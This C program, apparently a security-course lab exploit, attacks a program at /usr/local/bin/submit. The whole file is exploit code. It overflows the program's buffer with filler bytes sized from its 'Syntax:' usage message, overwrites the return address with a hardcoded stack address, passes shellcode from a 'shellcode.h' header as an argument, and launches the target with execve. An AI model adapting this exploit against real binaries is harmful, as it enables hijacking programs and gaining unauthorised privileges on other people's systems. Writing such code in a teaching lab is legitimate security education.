/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];

  // another way
  int syntaxLen = strlen("Syntax:\n\t");
  int addressLen = 4;
  int bufferLen = 211 - syntaxLen + addressLen + 1;
  char buffer[bufferLen + addressLen + 1];

  int i = 0;


  while(i < bufferLen) {
    buffer[i] = 'm';
    i = i + 1;
  }
  //0x ff bf df b8 - b8 dd bf ff


  buffer[i++] = 0xb8;
  buffer[i++] = 0xdf;
  buffer[i++] = 0xbf;
  buffer[i++] = 0xff;


  //append address of shellcode

  args[0] = buffer; 
  args[1] = "-h"; 
  args[2] = shellcode; 
  args[3] = NULL;

  env[0] = NULL; 

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
